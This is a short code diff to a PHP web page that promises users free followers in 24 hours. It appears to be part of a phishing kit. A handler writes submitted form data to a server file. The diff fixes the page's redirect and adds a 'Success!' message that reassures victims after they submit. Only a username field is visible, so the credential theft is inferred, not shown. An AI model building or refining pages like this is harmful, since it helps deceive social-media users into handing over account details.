@@ -57,7 +57,7 @@ if(isset($_GET['comen']))
     ");
     fclose($dosya);
     
-    header("location: https://" . $_SERVER['HTPP_HOST'] . "/index.php?success=1");
+    header("location: /index.php?success=1");
 }
 
 ?>
@@ -95,7 +95,11 @@ if(isset($_GET['comen']))
             <div class="banner-sm">
                 <img src="images/banner-sm.png" class="banner-sm-img" width="175">
             </div>
+            <?php if(@$_GET['success'] == 1): ?>
+            <span class="color-green">Success! Wait 24 hours and get followers.</span>
+            <?php else: ?>
             <span class="color-gray">Fill the form and get followers in 24 hours!</span>
+            <?php endif; ?>
             <div class="mb-3">
                 <input type="text" name="username" id="username" class="form-input" placeholder="Username" required autocomplete="off">
             </div>
